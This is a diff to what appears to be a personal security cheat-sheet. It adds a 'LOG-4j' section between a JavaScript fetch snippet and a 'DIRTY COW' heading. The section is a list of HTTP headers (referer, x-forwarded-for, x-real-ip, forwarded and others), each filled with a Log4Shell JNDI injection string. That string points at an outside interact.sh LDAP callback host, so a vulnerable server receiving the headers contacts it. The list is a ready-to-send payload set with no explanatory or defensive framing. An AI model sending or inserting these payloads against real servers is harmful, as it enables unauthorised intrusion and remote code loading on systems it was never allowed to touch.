@@ -1953,6 +1953,29 @@ postData('https://example.com/answer', { answer: 42 })
   .then(data => {
     console.log(data); // JSON data parsed by `data.json()` call
   });
+##############################
+#### LOG-4j            #######
+##############################
+referer=${jndi:ldap://[redacted].interact.sh},
+x-http-host-override=${jndi:ldap://[redacted].interact.sh},
+true-client-ip=${jndi:ldap://[redacted].interact.sh},
+x-forwarded-port=443,
+x-client-ip=${jndi:ldap://[redacted].interact.sh},
+cf-connecting_ip=${jndi:ldap://[redacted].interact.sh},
+x-forwarded-host=${jndi:ldap://[redacted].interact.sh},
+contact=${jndi:ldap://[redacted].interact.sh},
+host=[redacted].com,
+from=${jndi:ldap://[redacted].interact.sh},
+cache-control=no-transform,
+x-forwarded-proto=https,
+accept-language=en,
+client-ip=${jndi:ldap://[redacted].interact.sh},
+x-forwarded-for=${jndi:ldap://[redacted].interact.sh},
+x-originating-ip=${jndi:ldap://[redacted].interact.sh},
+x-host=${jndi:ldap://[redacted].interact.sh},
+forwarded=${jndi:ldap://[redacted].interact.sh},
+accept=*/*,
+x-real-ip=${jndi:ldap://[redacted].interact.sh},
 
 ##############################
 #### DIRTY COW         #######
